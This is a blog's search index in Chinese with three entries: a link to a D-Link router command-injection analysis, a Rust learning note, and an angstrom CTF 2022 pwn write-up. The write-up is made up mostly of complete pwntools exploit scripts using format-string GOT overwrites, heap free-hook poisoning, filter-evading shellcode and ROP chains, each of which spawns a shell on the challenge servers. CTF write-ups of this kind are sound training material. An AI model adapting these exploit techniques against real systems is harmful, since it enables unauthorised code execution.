<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DLink路由器命令注入漏洞复现</title>
    <url>/2022/04/15/DLink%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>本科课程的大作业，当时写的博客。</p>
<p><a href="https://www.freebuf.com/vuls/237533.html">D-Link DIR878路由器命令执行漏洞分析</a></p>
]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>CVE</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>angstrom_ctf_2022</title>
    <url>/2022/05/06/angstrom-ctf-2022/</url>
    <content><![CDATA[<p>做了今年angstrom ctf比赛，pwn里面有道区块链不会，大佬队友做的，其他的不是很难。</p>
<h2 id="caniride"><a href="#caniride" class="headerlink" title="caniride"></a>caniride</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;caniride&#x27;</span><br><span class="line"># io = process(&#x27;caniride&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31228)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;caniride&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    # gdb.attach(io, &#x27;b *$rebase(0x13F9)\nb *$rebase(0x147E)\nb main\nc&#x27;)</span><br><span class="line">    name = b&#x27;%105c%16$hhn%17$s&#x27;</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27;Pick your driver: &#x27;, &#x27;-3&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Hi, this is &#x27;)</span><br><span class="line">    elf_base = u64(io.recv(6) + b&#x27;\x00\x00&#x27;) - 0x35a8</span><br><span class="line">    log.success(&#x27;elf_base: &#x27; + hex(elf_base))</span><br><span class="line">    fini_array = elf_base + 0x3300</span><br><span class="line">    exit_got = elf_base + elf.got[&#x27;exit&#x27;]</span><br><span class="line">    printf_got = elf_base + elf.got[&#x27;printf&#x27;]</span><br><span class="line">    main = elf_base + elf.sym[&#x27;main&#x27;]</span><br><span class="line">    payload = p64(fini_array) + p64(exit_got)</span><br><span class="line">    io.sendlineafter(&#x27;So... tell me a little about yourself: &#x27;, payload)</span><br><span class="line">    libc_base = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:] + b&#x27;\x00\x00&#x27;) - libc.sym[&#x27;exit&#x27;]</span><br><span class="line">    log.success(&#x27;libc_base: &#x27; + hex(libc_base))</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    # one_gadget = libc_base + 0xe3b2e</span><br><span class="line">    name = b&#x27;&#x27;</span><br><span class="line">    cur_size = 0</span><br><span class="line">    for i in range(3):</span><br><span class="line">        target_size = (main &gt;&gt; (i * 16)) &amp; 0xffff</span><br><span class="line">        name += b&#x27;%&#x27; + str((0x10000 + target_size - cur_size) &amp; 0xffff).encode() + b&#x27;c&#x27;</span><br><span class="line">        name += b&#x27;%&#x27; + str(16 + i).encode() + b&#x27;$hn&#x27;</span><br><span class="line">        cur_size = target_size</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27;Pick your driver: &#x27;, &#x27;1&#x27;)</span><br><span class="line">    payload = b&#x27;&#x27;</span><br><span class="line">    for i in range(0, 6, 2):</span><br><span class="line">        payload += p64(exit_got + i)</span><br><span class="line">    io.sendlineafter(&#x27;So... tell me a little about yourself: &#x27;, payload)</span><br><span class="line">    name = b&#x27;&#x27;</span><br><span class="line">    cur_size = 0</span><br><span class="line">    for i in range(3):</span><br><span class="line">        target_size = (system &gt;&gt; (i * 16)) &amp; 0xffff</span><br><span class="line">        name += b&#x27;%&#x27; + str((0x10000 + target_size - cur_size) &amp; 0xffff).encode() + b&#x27;c&#x27;</span><br><span class="line">        name += b&#x27;%&#x27; + str(16 + i).encode() + b&#x27;$hn&#x27;</span><br><span class="line">        cur_size = target_size</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27;Pick your driver: &#x27;, &#x27;1&#x27;)</span><br><span class="line">    payload = b&#x27;&#x27;</span><br><span class="line">    for i in range(0, 6, 2):</span><br><span class="line">        payload += p64(printf_got + i)</span><br><span class="line">    io.sendlineafter(&#x27;So... tell me a little about yourself: &#x27;, payload)</span><br><span class="line">    sleep(1)</span><br><span class="line">    io.sendline(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="dreams"><a href="#dreams" class="headerlink" title="dreams"></a>dreams</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;dreams&#x27;</span><br><span class="line"># io = process(&#x27;dreams&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31227)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;dreams&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, data1, data2):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;In which page of your mind do you keep this dream? &#x27;, str(idx))</span><br><span class="line">    io.sendafter(&#x27;What\&#x27;s the date (mm/dd/yy))? &#x27;, data1)</span><br><span class="line">    io.sendafter(&#x27;what did you dream about? &#x27;, data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;, &#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Which one are you trading in? &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_edit(idx, data1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;, &#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;What dream is giving you trouble? &#x27;, str(idx))</span><br><span class="line">    io.recvuntil(&#x27;It looks like your dream is telling you that &#x27;)</span><br><span class="line">    result = io.recvline()[:-1]</span><br><span class="line">    io.sendafter(&#x27;New date: &#x27;, data1)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    MAX_DREAMS = elf.sym[&#x27;MAX_DREAMS&#x27;]</span><br><span class="line">    add(0, &#x27;a&#x27; * 8, &#x27;a&#x27; * 0x14)</span><br><span class="line">    add(1, &#x27;b&#x27; * 8, &#x27;b&#x27; * 0x14)</span><br><span class="line">    delete(0)</span><br><span class="line">    heap_base = u64(show_edit(0, p64(0)).ljust(8, b&#x27;\x00&#x27;)) - 0x10</span><br><span class="line">    log.success(&#x27;heap_base: &#x27; + hex(heap_base))</span><br><span class="line">    delete(1)</span><br><span class="line">    show_edit(1, p64(MAX_DREAMS - 8))</span><br><span class="line">    add(2, &#x27;b&#x27; * 8, &#x27;b&#x27; * 0x14)</span><br><span class="line">    add(3, p64(0), b&#x27;\x7f&#x27; * 8)</span><br><span class="line">    libc_base = u64(show_edit(3, p64(0))[8:].ljust(8, b&#x27;\x00&#x27;)) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line">    log.success(&#x27;libc_base: &#x27; + hex(libc_base)) </span><br><span class="line">    __free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    add(4, &#x27;c&#x27; * 8, &#x27;c&#x27; * 0x14)</span><br><span class="line">    delete(4)</span><br><span class="line">    delete(1)</span><br><span class="line">    show_edit(1, p64(__free_hook - 8))</span><br><span class="line">    add(7, &#x27;c&#x27; * 8, &#x27;c&#x27; * 0x14)</span><br><span class="line">    add(8, b&#x27;/bin/sh\x00&#x27;, p64(system))</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    delete(8)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="parity"><a href="#parity" class="headerlink" title="parity"></a>parity</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;parity&#x27;</span><br><span class="line"># io = process(&#x27;parity&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31226)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;parity&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    sc = &#x27;&#x27;&#x27;</span><br><span class="line">        push rdx;</span><br><span class="line">        pop rcx;</span><br><span class="line">        add byte ptr[rcx+10], 1;</span><br><span class="line">        push 0x71;</span><br><span class="line">        pop rdx;</span><br><span class="line">        pop rcx;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = asm(sc)</span><br><span class="line">    payload += b&#x27;\x0e\x05&#x27;      # fake for syscall \x0f\x05</span><br><span class="line">    for p in payload:</span><br><span class="line">        print(hex(p))</span><br><span class="line">    # gdb.attach(io, &#x27;b *0x4012F5\nc&#x27;)</span><br><span class="line">    io.sendafter(&#x27;&gt; &#x27;, payload)</span><br><span class="line">    # pause()</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    payload = b&#x27;a&#x27; * 0xc + asm(shellcraft.sh())</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="really-obnoxious-problem"><a href="#really-obnoxious-problem" class="headerlink" title="really obnoxious problem"></a>really obnoxious problem</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;really_obnoxious_problem&#x27;</span><br><span class="line"># io = process(&#x27;really_obnoxious_problem&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31225)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;really_obnoxious_problem&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, &#x27;payoung&#x27;)</span><br><span class="line">    payload = cyclic(0x40) + p64(0x404e00) + p64(0x40129D)</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    io.sendlineafter(&#x27;Address: &#x27;, payload)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="wah"><a href="#wah" class="headerlink" title="wah"></a>wah</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;wah&#x27;</span><br><span class="line"># io = process(&#x27;wah&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31224)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;wah&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    payload = cyclic(0x28) + p64(elf.sym[&#x27;flag&#x27;])</span><br><span class="line">    io.sendlineafter(&#x27;Cry: &#x27;, payload)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="whatsmyname"><a href="#whatsmyname" class="headerlink" title="whatsmyname"></a>whatsmyname</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;whatsmyname&#x27;</span><br><span class="line"># io = process(&#x27;whatsmyname&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31223)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;whatsmyname&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    io.sendafter(&#x27;Hi! What\&#x27;s your name? &#x27;, &#x27;a&#x27; * 0x30)</span><br><span class="line">    io.recvuntil(&#x27;a&#x27; * 0x30)</span><br><span class="line">    name = io.recvline()[:-2]</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    # if len(name) != 0x30:</span><br><span class="line">    #     raise EOFError</span><br><span class="line">    io.sendlineafter(&#x27;Guess my name and you\&#x27;ll get a flag!\n&#x27;, name)</span><br><span class="line">    io.recv()</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="whereami"><a href="#whereami" class="headerlink" title="whereami"></a>whereami</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;whereami&#x27;</span><br><span class="line"># io = process(&#x27;whereami&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31222)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;whereami&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    vuln = 0x0000000000401275</span><br><span class="line">    pop_rdi_ret = 0x0000000000401303</span><br><span class="line">    pop_rsi_r15_ret = 0x0000000000401301</span><br><span class="line">    puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">    puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    payload = cyclic(0x40) + p64(0x404e00) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br><span class="line">    io.sendlineafter(&#x27;Who are you? &#x27;, payload)</span><br><span class="line">    io.recvuntil(&#x27;I hope you find yourself too.\n&#x27;)</span><br><span class="line">    libc_base = u64(io.recvline()[:-1] + b&#x27;\x00\x00&#x27;) - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">    log.success(&#x27;libc_base: &#x27; + hex(libc_base))</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">    payload = cyclic(0x48) + p64(pop_rdi_ret) + p64(bin_sh)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret) + p64(0) * 2 + p64(system)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>rust_learning</title>
    <url>/2022/04/26/rust-learning/</url>
    <content><![CDATA[<h1 id="突发奇想"><a href="#突发奇想" class="headerlink" title="突发奇想"></a>突发奇想</h1><p>身边的大佬都身怀绝技会各种东西，之前想了很久学Rust，对这门所谓的内存安全的语言也挺感兴趣的。</p>
<p>然而一直在摆烂，觉得不能再这样下去了，打算每天少玩一点游戏多花点时间学习，而且我觉得安全太卷了我快要搞不下去了，学点编程技术随时跑路。</p>
<h1 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h1><p>对rust的应用场景还不是很清楚，目前可能先学习常见的语法，然后做做leetcode算法题，认识的大佬会出rust的ctf赛题，或许某天我也整点活。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>照这个配了一个调试环境<a href="https://www.runoob.com/rust/rust-println.html">菜鸟教程</a></p>
<p><a href="https://www.rust-lang.org/zh-CN">官方网站</a></p>
<p><a href="https://doc.rust-lang.org/book/">官方文档</a></p>
<p><a href="https://doc.rust-lang.org/stable/rust-by-example/">官方示例</a></p>
]]></content>
      <categories>
        <category>programming</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
</search>
